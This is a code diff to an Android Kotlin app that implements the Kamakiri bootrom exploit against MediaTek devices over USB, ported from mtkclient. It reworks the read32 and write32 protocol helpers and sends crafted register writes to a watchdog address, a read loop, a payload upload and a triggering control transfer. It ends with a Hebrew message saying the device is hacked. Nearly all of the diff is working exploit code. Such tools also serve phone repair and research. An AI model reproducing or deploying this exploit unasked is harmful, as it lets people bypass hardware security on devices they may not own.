@@ -2,7 +2,6 @@ package com.example.mtkusbtool
 
 import android.hardware.usb.UsbConstants
 import android.hardware.usb.UsbDevice
-import android.hardware.usb.UsbDeviceConnection
 import android.hardware.usb.UsbEndpoint
 import android.hardware.usb.UsbManager
 import java.nio.ByteBuffer
@@ -11,24 +10,7 @@ import java.util.Locale
 
 object MtkBromConnection {
 
-    private fun toLittleEndian(value: Int): ByteArray {
-        return ByteArray(4).apply {
-            this[0] = (value and 0xFF).toByte()
-            this[1] = ((value shr 8) and 0xFF).toByte()
-            this[2] = ((value shr 16) and 0xFF).toByte()
-            this[3] = ((value shr 24) and 0xFF).toByte()
-        }
-    }
-
-    private fun toBigEndian(value: Int): ByteArray {
-        return ByteArray(4).apply {
-            this[0] = ((value shr 24) and 0xFF).toByte()
-            this[1] = ((value shr 16) and 0xFF).toByte()
-            this[2] = ((value shr 8) and 0xFF).toByte()
-            this[3] = (value and 0xFF).toByte()
-        }
-    }
-
+    // Kamakiri exploit based on mtkclient's mtk_preloader.py
     fun runKamakiriExploit(
         usbManager: UsbManager,
         device: UsbDevice,
@@ -68,72 +50,85 @@ object MtkBromConnection {
             return buf
         }
 
-        fun echo(data: ByteArray) {
+        fun echo(data: ByteArray): Boolean {
             usbwrite(data)
-            usbread(data.size)
+            val response = usbread(data.size)
+            return response.contentEquals(data)
         }
 
-        fun write32(addr: Int, data: Int) {
-            usbwrite(byteArrayOf(0xD4.toByte()))
-            usbwrite(toLittleEndian(addr))
-            usbwrite(toLittleEndian(data))
-            usbread(4) // status
+        fun readDword(): Int {
+            val bytes = usbread(4)
+            if (bytes.size < 4) return -1
+            return ByteBuffer.wrap(bytes).order(ByteOrder.BIG_ENDIAN).int
         }
 
-        fun read32(addr: Int, dwords: Int) {
-            usbwrite(byteArrayOf(0xD1.toByte()))
-            usbwrite(toLittleEndian(addr))
-            usbwrite(toLittleEndian(dwords))
-            usbread(dwords * 4) // data
-            usbread(4) // status
+        fun read32(addr: Int, dwords: Int): ByteArray {
+            onProgress("read32(0x${Integer.toHexString(addr)}, $dwords)...")
+            if (!echo(byteArrayOf(0xD1.toByte()))) return ByteArray(0)
+            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())) return ByteArray(0)
+            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(dwords).array())) return ByteArray(0)
+            val status = readDword()
+            if (status > 0xFF) return ByteArray(0)
+            val data = usbread(dwords * 4)
+            usbread(2) // status2
+            return data
+        }
+
+        fun write32(addr: Int, values: IntArray) {
+            onProgress("write32(0x${Integer.toHexString(addr)}, ${values.joinToString(",")})...")
+            if (!echo(byteArrayOf(0xD4.toByte()))) return
+            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())) return
+            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array())) return
+            val status = readDword()
+            if (status > 0xFF) return
+            for (v in values) {
+                echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array())
+            }
         }
 
         onProgress("Starting Kamakiri exploit...")
-        
+
         val addr = 0x10007050 // watchdog (0x10007000) + 0x50
         val revdwordPayloadAddr = 0x000A1000 // revdword(0x100A00)
-        
+
         // 1. write32
-        onProgress("write32...")
-        write32(addr, revdwordPayloadAddr)
-        
+        write32(addr, intArrayOf(revdwordPayloadAddr))
+
         // 2. read32 loop
-        onProgress("read32 loop...")
         for (i in 0 until 0xF) {
             val readAddr = addr - (0xF - i) * 4
             val readLen = 0xF - i + 1
             read32(readAddr, readLen)
         }
-        
+
         // 3. echo b"\xE0"
         onProgress("echo 0xE0...")
         echo(byteArrayOf(0xE0.toByte()))
-        
+
         // 4. echo len(payload) as Big Endian
         onProgress("send payload length...")
-        val lenBytes = toBigEndian(payloadBytes.size)
-        echo(lenBytes)
-        
+        echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payloadBytes.size).array())
+
         // 5. check status (2 bytes)
         onProgress("check status...")
         usbread(2)
-        
+
         // 6. send payload
         onProgress("Sending payload...")
         usbwrite(payloadBytes)
-        
+
         // 7. read 2 bytes (ack?)
         onProgress("read ack...")
         usbread(2)
         usbread(2)
-        
-        // 8. ctrl_transfer
+
+        // 8. ctrl_transfer (request type 0xA1, request 0, value 0, index var1=0x25)
         onProgress("Triggering ctrl_transfer...")
         connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
-        
+
         connection.close()
         onProgress("Kamakiri exploit finished.")
-        
+
         return "הצלחה! פריצת Kamakiri הורצה. המכשיר פרוץ!"
     }
 }
